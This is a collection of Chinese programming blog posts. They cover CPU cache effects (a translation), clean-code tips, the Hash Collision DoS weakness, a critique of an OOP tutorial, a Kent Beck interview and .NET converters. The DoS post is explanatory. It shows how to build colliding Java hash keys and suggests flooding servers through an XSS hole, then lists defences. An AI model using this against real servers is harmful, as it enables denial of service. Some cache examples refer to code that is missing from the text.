CPU cache一直是理解计算机体系架构的重要知识点，也是并发编程设计中的技术难点，而且相关参考资料如同过江之鲫，浩瀚繁星，阅之如临深渊，味同嚼蜡，三言两语难以入门。正好网上有人推荐了微软大牛Igor Ostrovsky一篇博文 **《漫游处理器缓存效应》** ，文章不仅仅用7个最简单的源码示例就将CPU cache的原理娓娓道来，还附加图表量化分析做数学上的佐证，个人感觉这种案例教学的切入方式绝对是俺的菜，故而忍不住贸然译之，以飨列位看官。原文地址：Gallery of Processor Cache Effects大多数读者都知道cache是一种快速小型的内存，用以存储最近访问内存位置。这种描述合理而准确，但是更多地了解一些处理器缓存工作中的“烦人”细节对于理解程序运行性能有很大帮助。在这篇博客中，我将运用代码示例来详解cache工作的方方面面，以及对现实世界中程序运行产生的影响。下面的例子都是用C#写的，但语言的选择同程序运行状况以及得出的结论几乎没什么影响。目录* 示例1：内存访问和运行   * 示例2：缓存行的影响   * 示例3：L1和L2缓存大小   * 示例4：指令级别并发   * 示例5：缓存关联性   * 示例6：缓存行的伪共享(false-sharing)   * 示例7：硬件复杂性   * 关于第7个例子的一个回帖   * P.S.个人感悟——局部性原理和流水线并发   * 参考资料
#### 示例1：内存访问和运行你认为相较于循环1，循环2会运行多快？int[] arr = new int[64 * 1024 * 1024];// Loop 1     for (int i = 0; i < arr.Length; i++) arr[i] *= 3;// Loop 2     for (int i = 0; i < arr.Length; i += 16) arr[i] *= 3;第一个循环将数组的每个值乘3，第二个循环将每16个值乘3，第二个循环只做了第一个约6%的工作，但在现代机器上，两者几乎运行相同时间：在我机器上分别是80毫秒和78毫秒。两个循环花费相同时间的原因跟内存有关。 **循环执行时间长短由数组的内存访问次数决定的，而非整型数的乘法运算次数。** 经过下面对第二个示例的解释，你会发现硬件对这两个循环的主存访问次数是相同的。#### 示例2：缓存行的影响让我们进一步探索这个例子。我们将尝试不同的循环步长，而不仅仅是1和16。`for (int i = 0; i < arr.Length; i += K) arr[i] *= 3;`下图为该循环在不同步长(K)下的运行时间：
!running times of this loop for different step values \(K\)注意当步长在1到16范围内，循环运行时间几乎不变。但从16开始，每次步长加倍，运行时间减半。背后的原因是今天的CPU不再是按字节访问内存，而是以64字节为单位的块(chunk)拿取，称为一个缓存行(cache line)。当你读一个特定的内存地址，整个缓存行将从主存换入缓存，并且访问同一个缓存行内的其它值的开销是很小的。由于16个整型数占用64字节（一个缓存行），for循环步长在1到16之间必定接触到相同数目的缓存行：即数组中所有的缓存行。当步长为32，我们只有大约每两个缓存行接触一次，当步长为64，只有每四个接触一次。理解缓存行对某些类型的程序优化而言可能很重要。比如，数据字节对齐可能决定一次操作接触1个还是2个缓存行。那上面的例子来说，很显然操作不对齐的数据将损失一半性能。#### 示例3：L1和L2缓存大小今天的计算机具有两级或三级缓存，通常叫做L1、L2以及可能的L3（译者注：如果你不明白什么叫二级缓存，可以参考这篇精悍的博文lol）。如果你想知道不同缓存的大小，你可以使用系统内部工具CoreInfo，或者Windows API调用GetLogicalProcessorInfo.aspx)。两者都将告诉你缓存行以及缓存本身的大小。
在我的机器上，CoreInfo现实我有一个32KB的L1数据缓存，一个32KB的L1指令缓存，还有一个4MB大小L2数据缓存。L1缓存是处理器独享的，L2缓存是成对处理器共享的。Logical Processor to Cache Map:   *— Data Cache 0, Level 1, 32 KB, Assoc 8, LineSize 64   *— Instruction Cache 0, Level 1, 32 KB, Assoc 8, LineSize 64   -*– Data Cache 1, Level 1, 32 KB, Assoc 8, LineSize 64   -*– Instruction Cache 1, Level 1, 32 KB, Assoc 8, LineSize 64   **– Unified Cache 0, Level 2, 4 MB, Assoc 16, LineSize 64   –*- Data Cache 2, Level 1, 32 KB, Assoc 8, LineSize 64   –*- Instruction Cache 2, Level 1, 32 KB, Assoc 8, LineSize 64   —* Data Cache 3, Level 1, 32 KB, Assoc 8, LineSize 64   —* Instruction Cache 3, Level 1, 32 KB, Assoc 8, LineSize 64   –** Unified Cache 1, Level 2, 4 MB, Assoc 16, LineSize 64
（译者注：作者平台是四核机，所以L1编号为0~3，数据/指令各一个，L2只有数据缓存，两个处理器共享一个，编号0~1。关联性字段在后面例子说明。）让我们通过一个实验来验证这些数字。遍历一个整型数组，每16个值自增1——一种节约地方式改变每个缓存行。当遍历到最后一个值，就重头开始。我们将使用不同的数组大小，可以看到当数组溢出一级缓存大小，程序运行的性能将急剧滑落。下图是运行时间图表：   !cache size你可以看到在32KB和4MB之后性能明显滑落——正好是我机器上L1和L2缓存大小。#### 示例4：指令级别并发现在让我们看一看不同的东西。下面两个循环中你以为哪个较快？int steps = 256 * 1024 * 1024;     int[] a = new int[2];结果是第二个循环约比第一个快一倍，至少在我测试的机器上。为什么呢？这跟两个循环体内的操作指令依赖性有关。第一个循环体内，操作做是相互依赖的（译者注：下一次依赖于前一次）：   !same value dependency   但第二个例子中，依赖性就不同了：   !different values dependency
现代处理器中对不同部分指令拥有一点并发性（译者注：跟流水线有关，比如Pentium处理器就有U/V两条流水线，后面说明）。这使得CPU在同一时刻访问L1两处内存位置，或者执行两次简单算术操作。在第一个循环中，处理器无法发掘这种指令级别的并发性，但第二个循环中就可以。[原文更新]：许多人在reddit上询问有关编译器优化的问题，像{ a[0]++; a[0]++; }能否优化为{ a[0]+=2; }。实际上，C#编译器和CLR JIT没有做优化——在数组访问方面。我用release模式编译了所有测试（使用优化选项），但我查询了JIT汇编语言证实优化并未影响结果。#### 示例5：缓存关联性缓存设计的一个关键决定是确保每个主存块(chunk)能够存储在任何一个缓存槽里，或者只是其中一些（译者注：此处一个槽位就是一个缓存行）。有三种方式将缓存槽映射到主存块中：1. **直接映射(Direct mapped cache)**   每个内存块只能映射到一个特定的缓存槽。一个简单的方案是通过块索引chunk_index映射到对应的槽位(chunk_index % cache_slots)。被映射到同一内存槽上的两个内存块是不能同时换入缓存的。（译者注：chunk_index可以通过物理地址/缓存行字节计算得到）
2. **N路组关联(N-way set associative cache)**   每个内存块能够被映射到N路特定缓存槽中的任意一路。比如一个16路缓存，每个内存块能够被映射到16路不同的缓存槽。一般地，具有一定相同低bit位地址的内存块将共享16路缓存槽。（译者注：相同低位地址表明相距一定单元大小的连续内存）3. **完全关联(Fully associative cache)**   每个内存块能够被映射到任意一个缓存槽。操作效果上相当于一个散列表。直接映射缓存会引发冲突——当多个值竞争同一个缓存槽，它们将相互驱逐对方，导致命中率暴跌。另一方面，完全关联缓存过于复杂，并且硬件实现上昂贵。N路组关联是处理器缓存的典型方案，它在电路实现简化和高命中率之间取得了良好的折中。!完全关联与多路关联的cache映射   （此图由译者给出，直接映射和完全关联可以看做N路组关联的两个极端，从图中可知当N=1时，即直接映射；当N取最大值时，即完全关联。读者可以自行想象直接映射图例，具体表述见参考资料。）举个例子，4MB大小的L2缓存在我机器上是16路关联。所有64字节内存块将分割为不同组，映射到同一组的内存块将竞争L2缓存里的16路槽位。
L2缓存有65,536个缓存行（译者注：4MB/64），每个组需要16路缓存行，我们将获得4096个集。这样一来，块属于哪个组取决于块索引的低12位bit(2^12=4096)。 **因此缓存行对应的物理地址凡是以262,144字节(4096*64)的倍数区分的，将竞争同一个缓存槽。我机器上最多维持16个这样的缓存槽。** （译者注：请结合上图中的2路关联延伸理解，一个块索引对应64字节，chunk0对应组0中的任意一路槽位，chunk1对应组1中的任意一路槽位，以此类推chunk4095对应组4095中的任意一路槽位，chunk0和chunk4096地址的低12bit是相同的，所以chunk4096、chunk8192将同chunk0竞争组0中的槽位，它们之间的地址相差262,144字节的倍数，而最多可以进行16次竞争，否则就要驱逐一个chunk）。为了使得缓存关联效果更加明了，我需要重复地访问同一组中的16个以上的元素，通过如下方法证明：public static long UpdateEveryKthByte(byte[] arr, int K)     {     Stopwatch sw = Stopwatch.StartNew();     const int rep = 1024*1024; // Number of iterations – arbitrary     int p = 0;     for (int i = 0; i < rep; i++)     {     arr[p]++;     p += K;     if (p >= arr.Length) p = 0;     }     sw.Stop();     return sw.ElapsedMilliseconds;     }
该方法每次在数组中迭代K个值，当到达末尾时从头开始。循环在运行足够长（2^20次）之后停止。我使用不同的数组大小（每次增加1MB）和不同的步长传入UpdateEveryKthByte()。以下是绘制的图表，蓝色代表运行较长时间，白色代表较短时间：   !timing   蓝色区域（较长时间）表明当我们重复数组迭代时，更新的值无法同时放在缓存中。浅蓝色区域对应80毫秒，白色区域对应10毫秒。让我们来解释一下图表中蓝色部分：**1.为何有垂直线？** 垂直线表明步长值过多接触到同一组中内存位置（大于16次）。在这些次数里，我的机器无法同时将接触过的值放到16路关联缓存中。一些糟糕的步长值为2的幂：256和512。举个例子，考虑512步长遍历8MB数组，存在32个元素以相距262,144字节空间分布，所有32个元素都会在循环遍历中更新到，因为512能够整除262,144（译者注：此处一个步长代表一个字节）。由于32大于16，这32个元素将一直竞争缓存里的16路槽位。（译者注：为何512步长的垂直线比256步长颜色更深？在同样足够多的步数下，512比256访问到存在竞争的块索引次数多一倍。比如跨越262,144字节边界512需要512步，而256需要1024步。那么当步数为2^20时，512访问了2048次存在竞争的块而256只有1024次。最差情况下步长为262,144的倍数，因为每次循环都会引发一个缓存行驱逐。）
有些不是2的幂的步长运行时间长仅仅是运气不好，最终访问到的是同一组中不成比例的许多元素，这些步长值同样显示为蓝线。**2.为何垂直线在4MB数组长度的地方停止？** 因为对于小于等于4MB的数组，16路关联缓存相当于完全关联缓存。一个16路关联缓存最多能够维护16个以262,144字节分隔的缓存行，4MB内组17或更多的缓存行都没有对齐在262,144字节边界上，因为16*262,144=4,194,304。**3.为何左上角出现蓝色三角？** 在三角区域内，我们无法在缓存中同时存放所有必要的数据，不是出于关联性，而仅仅是因为L2缓存大小所限。举个例子，考虑步长128遍历16MB数组，数组中每128字节更新一次，这意味着我们一次接触两个64字节内存块。为了存储16MB数组中每两个缓存行，我们需要8MB大小缓存。但我的机器中只有4MB缓存（译者注：这意味着必然存在冲突从而延时）。即使我机器中4MB缓存是全关联，仍无法同时存放8MB数据。**4.为何三角最左边部分是褪色的？** 注意左边0~64字节部分——正好一个缓存行！就像上面示例1和2所说，额外访问相同缓存行的数据几乎没有开销。比如说，步长为16字节，它需要4步到达下一个缓存行，也就是说4次内存访问只有1次开销。
在相同循环次数下的所有测试用例中，采取省力步长的运行时间来得短。将图表延伸后的模型：   !timing2缓存关联性理解起来有趣而且确能被证实，但对于本文探讨的其它问题比起来，它肯定不会是你编程时所首先需要考虑的问题。#### 示例6：缓存行的伪共享(false-sharing)在多核机器上，缓存遇到了另一个问题——一致性。不同的处理器拥有完全或部分分离的缓存。在我的机器上，L1缓存是分离的（这很普遍），而我有两对处理器，每一对共享一个L2缓存。这随着具体情况而不同，如果一个现代多核机器上拥有多级缓存，那么快速小型的缓存将被处理器独占。**当一个处理器改变了属于它自己缓存中的一个值，其它处理器就再也无法使用它自己原来的值，因为其对应的内存位置将被刷新(invalidate)到所有缓存。而且由于缓存操作是以缓存行而不是字节为粒度，所有缓存中整个缓存行将被刷新！**为证明这个问题，考虑如下例子：在我的四核机上，如果我通过四个线程传入参数0,1,2,3并调用UpdateCounter，所有线程将花费4.3秒。另一方面，如果我传入16,32,48,64，整个操作进花费0.28秒！为何会这样？第一个例子中的四个值很可能在同一个缓存行里，每次一个处理器增加计数，这四个计数所在的缓存行将被刷新，而其它处理器在下一次访问它们各自的计数（译者注：注意数组是private属性，每个线程独占）将失去命中(miss)一个缓存。这种多线程行为有效地禁止了缓存功能，削弱了程序性能。
#### 示例7：硬件复杂性即使你懂得了缓存的工作基础，有时候硬件行为仍会使你惊讶。不用处理器在工作时有不同的优化、探试和微妙的细节。有些处理器上，L1缓存能够并发处理两路访问，如果访问是来自不同的存储体，而对同一存储体的访问只能串行处理。而且处理器聪明的优化策略也会使你感到惊讶，比如在伪共享的例子中，以前在一些没有微调的机器上运行表现并不良好，但我家里的机器能够对最简单的例子进行优化来减少缓存刷新。下面是一个“硬件怪事”的奇怪例子：当我在循环体内进行三种不同操作，我得到如下运行时间：**操作** **时间**   A++; B++; C++; D++; 719 ms   A++; C++; E++; G++; 448 ms   A++; C++; 518 ms增加A,B,C,D字段比增加A,C,E,G字段花费更长时间，更奇怪的是，增加A,C两个字段比增加A,C,E,G执行更久！我无法肯定这些数字背后的原因，但我怀疑这跟存储体有关，如果有人能够解释这些数字，我将洗耳恭听。这个例子的教训是，你很难完全预测硬件的行为。你可以预测很多事情，但最终，衡量及验证你的假设非常重要。#### 关于第7个例子的一个回帖
Goz：我询问Intel的工程师最后的例子，得到以下答复：“很显然这涉及到执行单元里指令是怎样终止的，机器处理存储-命中- 加载的速度，以及如何快速且优雅地处理试探性执行的循环展开（比如是否由于内部冲突而多次循环）。但这意味着你需要非常细致的流水线跟踪器和模拟器才能弄明白。在纸上预测流水线里的乱序指令是无比困难的工作，就算是设计芯片的人也一样。对于门外汉来说，没门，抱歉！”#### P.S.个人感悟——局部性原理和流水线并发程序的运行存在 **时间和空间上的局部性** ，前者是指只要内存中的值被换入缓存，今后一段时间内会被多次引用，后者是指该内存附近的值也被换入缓存。如果在编程中特别注意运用局部性原理，就会获得性能上的回报。比如 **C语言中应该尽量减少静态变量的引用，** 这是因为静态变量存储在全局数据段，在一个被反复调用的函数体内，引用该变量需要对缓存多次换入换出，而如果是分配在堆栈上的局部变量，函数每次调用CPU只要从缓存中就能找到它了，因为堆栈的重复利用率高。再比如 **循环体内的代码要尽量精简，** 因为代码是放在指令缓存里的，而指令缓存都是一级缓存，只有几K字节大小，如果对某段代码需要多次读取，而这段代码又跨越一个L1缓存大小，那么缓存优势将荡然无存。
关于 **CPU的流水线(pipeline)并发性** 简单说说，Intel Pentium处理器有两条流水线U和V，每条流水线可各自独立地读写缓存，所以可以在一个时钟周期内同时执行两条指令。但这两条流水线不是对等的，U流水线可以处理所有指令集，V流水线只能处理简单指令。CPU指令通常被分为四类，第一类是常用的简单指令，像mov, nop, push, pop, add, sub, and, or, xor, inc, dec, cmp, lea，可以在任意一条流水线执行，只要相互之间不存在依赖性，完全可以做到指令并发。第二类指令需要同别的流水线配合，像一些进位和移位操作，这类指令如果在U流水线中，那么别的指令可以在V流水线并发运行，如果在V流水线中，那么U流水线是暂停的。第三类指令是一些跳转指令，如cmp,call以及条件分支，它们同第二类相反，当工作在V流水线时才能通U流水线协作，否则只能独占CPU。第四类指令是其它复杂的指令，一般不常用，因为它们都只能独占CPU。如果是汇编级别编程， **要达到指令级别并发，必须要注重指令之间的配对。** 尽量使用第一类指令，避免第四类，还要在顺序上减少上下文依赖。
#### 参考资料wiki上的CPU cache解析（中文版）（英文版）。上海交通大学师生制作的一个关于cache映射功能、命中率计算的教学演示程序，模拟了不同关联模式下cache的映射和命中几率，形象直观。网易数据库大牛@何_登成自制PPT《CPU Cache and Memory Ordering》，信息量超大！南京大学计算机教学公开PPT，温馨提示，地址域名里面改变字段”lecture”后面的数字编号可切换课程;-)（全文完）# 整洁代码的4个提示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn虽然这样的文章非常的多，并且，就算是对于编程新手来说，也是非常的简单和显而见，但是，在我们进行Code Review过程中，我们还是能够看到那些非常混乱的代码，所以，有些时候，你会在想，是不是这样的规则太多了，导致我们的程序员记不住。虽然我们在以前的文章中一遍又一遍的说过（比如：《优质代码的十诫》），千言万语总结一下，无论你用什么样的语言，最最基本的编程原则就是下面这四条。**1 – 简短的方法**简单才会易读，简单才会容易，简单才能重用，简单才能保证质量。把一件事搞复杂，是一件简单的事；而把一件事变简单，这则是一件复杂的事。KISS-Keep it Simple Stupid是一种哲学，Do one thing, Do it best也是一种哲学。这些都是在告诉我们，做设计，做产品，不要把所有的东西一下子都考虑进来，否则将会让你的事情变成一团糟，剪不断理还乱，就是这样道理。把复杂的事情，困难的事情，逐步细化，分解成一个一个简单而单一的事情，然后再把他们拼装起来完成一个复杂的事情，是我们如何完成一个巨大并复杂的项目的通用方法。
编程也是这个道理，维护代码的成本会比你创造代码的成本要大得多，所以，一个简短的方法不但可以有利于阅读，维护，重用，同样在进行排错调试测试的时候也能起到巨大的帮助。比如，对于一个简单的方法或函数，单元测试，功能测试，性能测试、代码覆盖，质量保证都能变得相当简单，而这些众多的质量优良的方法最终组成了那质量过硬的最终产品，并让我们在以后的代码不断改进中继续充当重要的作用。**2 – 选择望文知意的直观的变量名和函数名**无论是变量名还是方法名，都不能太长或是太短。一个好的命名，应该是“自解释的”，直观的，望文知意的。通常来说，一个好的命名应该是知道这个变量/方法要干什么事情，比如GetComputerName()，isAdmin等等，对于变量名来说，通过其名字，我们可以知道这个变量的类型（整型，浮点，指针，……），种类（全局，成员，局部，静态，……）。关于命名的事情，可以查看《编程命名中的7+1个提示》和《编程中的命名设计那点事》查看更多的内容。**3 – 只写有意义的注释**代码写得好的话，是不需要注释的。与其花费大量的时候去写注释，还不如把这些时间花在代码重构上，简洁/易读的代码比详细的注释更有意义。另外，如果你需要使用你的注释来生成文档，那么也不需要太过复杂，这通常用来做API的文档，这个时候，关键不在于你是如何实现的，而是在于告诉别人完成什么样的事并如何使用之。总之，一句话， **如果你的代码足够的简单和清楚，你是不需要写注释的** 。   **4 – 让你的代码可读**
你的代码并不只是让编译器去阅读的，你的代码更应该是让你的同事和其它人阅读的。所以，一定要遵守团队内部的那些最中规中矩的编程规范或代码风格，千万不要在代码中使你的小聪明或是偷懒或是hack代码，那样做的结果只会有两个，一个是你的代码会被后人骂得一无是处，另一个就是当你在以后维护你的代码时无异于搬起石头砸了自己的脚。编码坚持最基本的两个原则—— KISS 和DRY，剩下的就是顺从于自然。（全文完）# Hash Collision DoS 问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn最近，除了国内明文密码的安全事件，还有一个事是比较大的，那就是 Hash Collision DoS （Hash碰撞的拒绝式服务攻击），有恶意的人会通过这个安全弱点会让你的服务器运行巨慢无比。 **这个安全弱点利用了各语言的Hash算法的“非随机性”可以制造出N多的value不一样，但是key一样数据，然后让你的Hash表成为一张单向链表，而导致你的整个网站或是程序的运行性能以级数下降（可以很轻松的让你的CPU升到100%）** 。目前，这个问题出现于Java, JRuby, PHP, Python, Rubinius, Ruby这些语言中，主要：
* Java, 所有版本   * JRuby <= 1.6.5 （目前fix在 1.6.5.1）   * PHP <= 5.3.8, <= 5.4.0RC3 （目前fix在 5.3.9, 5.4.0RC4）   * Python, all versions   * Rubinius, all versions   * Ruby <= 1.8.7-p356 （目前fix在 1.8.7-p357, 1.9.x）   * Apache Geronimo, 所有版本   * Apache Tomcat <= 5.5.34, <= 6.0.34, <= 7.0.22 （目前fix在 5.5.35, 6.0.35, 7.0.23）   * Oracle Glassfish <= 3.1.1 （目前fix在mainline）   * Jetty, 所有版本   * Plone, 所有版本   * Rack <= 1.3.5, <= 1.2.4, <= 1.1.2 （目前fix 在 1.4.0, 1.3.6, 1.2.5, 1.1.3）   * V8 JavaScript Engine, 所有版本   * ASP.NET 没有打MS11-100补丁
注意，Perl没有这个问题，因为Perl在N年前就fix了这个问题了。关于这个列表的更新，请参看 oCERT的2011-003报告，比较坑爹的是，这个问题早在2003 年就在论文《通过算法复杂性进行拒绝式服务攻击》中被报告了，但是好像没有引起注意，尤其是Java。#### 弱点攻击解释你可以会觉得这个问题没有什么大不了的，因为黑客是看不到hash算法的，如果你这么认为，那么你就错了，这说明对Web编程的了解还不足够底层。无论你用JSP，PHP，Python，Ruby来写后台网页的时候，在处理HTTP POST数据的时候，你的后台程序可以很容易地以访问表单字段名来访问表单值，就像下面这段程序一样：$usrname = $_POST['username'];     $passwd = $_POST['password'];这是怎么实现的呢？这后面的东西就是Hash Map啊，所以，我可以给你后台提交一个有10K字段的表单，这些字段名都被我精心地设计过，他们全是Hash Collision ，于是你的Web Server或语言处理这个表单的时候，就会建造这个hash map，于是在每插入一个表单字段的时候，都会先遍历一遍你所有已插入的字段，于是你的服务器的CPU一下就100%了，你会觉得这10K没什么，那么我就发很多个的请求，你的服务器一下就不行了。
举个例子，你可能更容易理解：如果你有n个值—— v1, v2, v3, … vn，把他们放到hash表中应该是足够散列的，这样性能才高：> 0 -> v2   >  1 -> v4   >  2 -> v1   >  …   >  …   >  n -> v(x)但是，这个攻击可以让我造出N个值—— dos1, dos2, …., dosn，他们的hash key都是一样的（也就是Hash Collision），导致你的hash表成了下面这个样子：> 0 – > dos1 -> dos2 -> dos3 -> …. ->dosn   >  1 -> null   >  2 -> null   >  …   >  …   >  n -> null于是，单向链接就这样出现了。这样一来，O(1)的搜索算法复杂度就成了O(n)，而插入N个数据的算法复杂度就成了O(n^2)，你想想这是什么样的性能。（关于Hash表的实现，如果你忘了，那就把大学时的《数据结构》一书拿出来看看）####  Hash Collision DoS 详解StackOverflow.com是个好网站， 合格的程序员都应该知道这个网站。上去一查，就看到了这个贴子“Application vulnerability due to Non Random Hash Functions”。我把这个贴子里的东西摘一些过来。
首先，这些语言使用的Hash算法都是“非随机的”，如下所示，这个是Java和Oracle使用的Hash函数：所谓“非随机的” Hash算法，就可以猜。比如：1）在Java里， Aa和BB这两个字符串的hash code(或hash key) 是一样的，也就是Collision 。2）于是，我们就可以通过这两个种子生成更多的拥有同一个hash key的字符串。如：”AaAa”, “AaBB”, “BBAa”, “BBBB”。这是第一次迭代。其实就是一个排列组合，写个程序就搞定了。3）然后，我们可以用这4个长度的字符串，构造8个长度的字符串，如下所示："AaAaAaAa", "AaAaBBBB", "AaAaAaBB", "AaAaBBAa",     "BBBBAaAa", "BBBBBBBB", "BBBBAaBB", "BBBBBBAa",     "AaBBAaAa", "AaBBBBBB", "AaBBAaBB", "AaBBBBAa",     "BBAaAaAa", "BBAaBBBB", "BBAaAaBB", "BBAaBBAa",`4）同理，我们就可以生成16个长度的，以及256个长度的字符串，总之，很容易生成N多的这样的值。`
在攻击时，我只需要把这些数据做成一个HTTP POST 表单，然后写一个无限循环的程序，不停地提交这个表单。你用你的浏览器就可以了。当然，如果做得更精妙一点的话，把你的这个表单做成一个跨站脚本，然后找一些网站的跨站漏洞，放上去，于是能过SNS的力量就可以找到N多个用户来帮你从不同的IP来攻击某服务器。#### 防守要防守这样的攻击，有下面几个招：* 打补丁，把hash算法改了。   * 限制POST的参数个数，限制POST的请求长度。   * 最好还有防火墙检测异常的请求。不过，对于更底层的或是其它形式的攻击，可能就有点麻烦了。（全文完）# 如此理解面向对象编程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn从Rob Pike 的 Google+上的一个推看到了一篇叫《Understanding Object Oriented Programming》的文章，我先把这篇文章简述一下，然后再说说老牌黑客Rob Pike的评论。先看这篇教程是怎么来讲述OOP的。它先给了下面这个问题，这个问题需要输出一段关于操作系统的文字：假设Unix很不错，Windows很差。
这个把下面这段代码描述成是 **Hacker Solution** 。（这帮人觉得下面这叫黑客？我估计这帮人真是没看过C语言的代码）然后开始用面向对象的编程方式一步一步地进化这个代码。先是以过程化的思路来重构之。目录* 过程化的方案   * 幼稚的面向对象编程   * OO大师的方案   * Rob Pike的评论   * 我的理解#### 过程化的方案然后是一个幼稚的面向对象的思路。#### 幼稚的面向对象编程他们觉得上面这段代码没有消除if语句，他们说这叫代码的“logic bottleneck”（逻辑瓶颈），因为如果你要增加一个操作系统的判断的话，你不但要加个类，还要改那段if-else的语句。所以，他们整出一个叫Sophisticated的面向对象的解决方案。#### OO大师的方案注意其中的Design Pattern作者还非常的意地说，他加了一个“Mac OS”的东西。 **老实说，当我看到最后这段OO大师搞出来的代码，我快要吐了** 。我瞬间想到了两件事：一个是以前酷壳上的《面向对象是个骗局》和 《各种流行的编程方式》中说的“设计模式驱动编程”，另一个我想到了那些被敏捷洗过脑的程序员和咨询师，也是这种德行。
于是我去看了一下第一作者Joseph Bergin的主页，这个Ph.D是果然刚刚完成了一本关于敏捷和模式的书。#### Rob Pike的评论（Rob Pike是当年在Bell lab里和Ken一起搞Unix的主儿，后来和Ken开发了UTF-8，现在还和Ken一起搞Go语言。注：不要以为Ken和Dennis是基友，其实他们才是真正的老基友！）Rob Pike在他的Google+的这贴里评论到这篇文章——他并不确认这篇文章是不是搞笑？但是他觉得这些个写这篇文章是很认真的。他说他要评论这篇文章是因为他们是一名Hacker，至少这个词出现在这篇文章的术语中。他说，这个程序根本就不需要什么Object，只需要一张小小的配置表格，里面配置了对应的操作系统和你想输出的文本。这不就完了。这么简单的设计，非常容易地扩展，他们那个所谓的Hack Solution完全就是笨拙的代码。后面那些所谓的代码进化相当疯狂和愚蠢的，这个完全误导了对编程的认知。然后，他还说， **他觉得这些OO的狂热份子非常害怕数据，他们喜欢用多层的类的关系来完成一个本来只需要检索三行数据表的工作** 。他说他曾经听说有人在他的工作种用各种OO的东西来替换While循环。（我听说中国Thoughtworks那帮搞敏捷的人的确喜欢用Object来替换所有的if- else语句，他们甚至还喜欢把函数的行数限制在10行以内）
他还给了一个链接，你可以读一读。最后他说， **OOP的本质就是——对数据和与之关联的行为进行编程** 。便就算是这样也不完全对，因为：**Sometimes data is just data and functions are just functions.**#### 我的理解我觉得，这篇文章的例子举得太差了，差得感觉就像是OO的高级黑。面向对象编程注重的是： **1）数据和其行为的打包封装，2）程序的接口和实现的解耦** 。你那怕，举一个多个开关和多个电器的例子，不然就像STL中，一个排序算法对多个不同容器的例子，都比这个例子要好得多得多。老实说，Java SDK里太多这样的东西了。我以前给一些公司讲一些设计模式的培训课，我一再提到， **那23个经典的设计模式和OO半毛钱关系没有** ，只不过人家用OO来实现罢了。 **设计模式就三个准则：1）中意于组合而不是继承，2）依赖于接口而不是实现，3）高内聚，低耦合。你看，这完全就是Unix的设计准则** 。（全文完）# Kent Beck 谈单元测试和持续部署作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
_文章来源_2010年7月2日，Roy Osherove 和 Kent Beck 在 blog.typemock.com 进行了一次对话，话题涉及单元测试（Unit Testing），JUnit Max（Kent 开发的一个单元测试的 Eclipse Plugin，不免费），和面向初创企业的精益方法（Lean Startups）。**单元测试和 JUnit Max**   作为软件开发方法学的大师、极限编程XP的创始人、敏捷宣言的创始人之一，Kent Beck 一直在努力最大化地利用单元测试的价值，他说一些程序员仍然认为单元测试并不是他们的工作，但是单元测试确实能够提高软件的质量。目前他正在开发 JUnit Max，这是一个 Eclipse plugin，每当程序员保存一个 Java 源文件的时候，JUnit Max 就会运行测试并报告反馈信息。测试中的错误将会如同编译错误一样被报告给程序员。JUnit Max 的核心思想是测试错误应该和编译错误一样被 IDE 报告给程序员，程序员不需要额外的菜单选项或者运行其他的工具来运行测试。特别是那些经常失败的测试，对于程序员来说是非常有价值的反馈信息。在测试驱动开发（Test Driven Development – TDD）中，我们重复着这样一个循环：“编写一个‘失败’的测试（Failing Test）” – “编码实现功能以便让测试通过”，随着开发的深入，测试越来越丰富，测试能够反馈给程序员的信息也越来越多，它们可以帮助程序员找出那些需要改进的代码。JUnit Max 能够缩短这个循环的周期，因为它更为频繁地运行测试和提供反馈。Roy 问道：“当你一个人编码的时候，你是否严格地遵循 TDD，即一定要先写测试，然后写实现代码。我个人发现这并不是一件容易做到的事情，特别是当一个人编码的时候。” Kent 回答：“视情况而定，有时候并不需要死板地遵循 TDD，比如当我在做一些探索性或者说实验性的编码时，并不需要写测试，因为我只是想尝试一下某些功能和特性。”
Roy： “你在测试驱动开发中见过的最糟糕的错误有哪些？”   Kent：“很多程序员仅仅是拷贝和粘贴测试代码，但并不理解它们。所以我们经常能看到没有断言的测试，同时测试很多逻辑和功能的测试，过于臃肿或者过于短小的测试等等。当然这些错误在学习过程中很普遍，也是我们学习的一部分。”Roy：“你下一步最想尝试的新概念是什么？”   Kent：“我最近谈论的一个主题是 Software G Forces，是关于软件产品的部署频率（Frequency of Deployment），这里的部署是指面向最终用户的部署或者说发布，是生产环境而非测试环境。从前的软件产品每年（或数年）发布一个新的版本，而现在的软件产品发布频率越来越快，从每季度，每月，每周，每天，直至每小时。Kent 提及有一些非常复杂的软件产品的发布频率甚至是每天 40 到 50 次。此时 Roy 提出了一个非常好的问题：“产品发布得如此频繁，我们如何能够在这么短的时间间隔内获得用户反馈呢？”，Kent 回答道：“持续部署（Continuous Deployment）确实需要一些基础设施建设来支持，比如：自动版本回滚，自动错误检测，系统同时运行多个版本的能力，比如一个服务器集群中不同的服务器上可以运行产品的不同版本。”
Roy 问道：“当你在开发一个产品的时候，你在为客户创造价值，而持续部署创造的则是一种内在的价值，并且实施过程也是非常复杂的，你怎样投入时间去实施它呢？是否需要从产品设计的一开始就考虑这些问题呢？”，Kent 答道：“5 年之内市场上可能会有许多持续部署的产品出现，目前我们可能需要自己来寻求解决方案，因为现在它还是一个较新的领域。持续部署的重点之一是及时捕获系统错误，不仅仅是技术层面上的错误，同时也包括业务层面。以 Amazon.com 为例，他们评价系统运行的良好程度是以业务运营状况为依据的，如果销售额出现不明原因的下降，系统也会发出错误警告。”注：为了不让文章过长，下半部分的面向初创企业的精益方法（Lean Startups）将在后面发布。# .NET代码转换器作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn想把.NET的代码（C#和VB.NET)互转吗？或是转成Python或Ruby吗？在  站点上有这样的在线工具。点击下面的链接你可以使用这些工具。当然，这些工具也有很多BUG。* 把 C# 转成 VB.NET   * 把 C# 转成 Python   * 把 C# 转成Ruby   * 把 VB.NET 转成C#   * 把 VB.NET 转成 Python   * 把 VB.NET 转成 Ruby
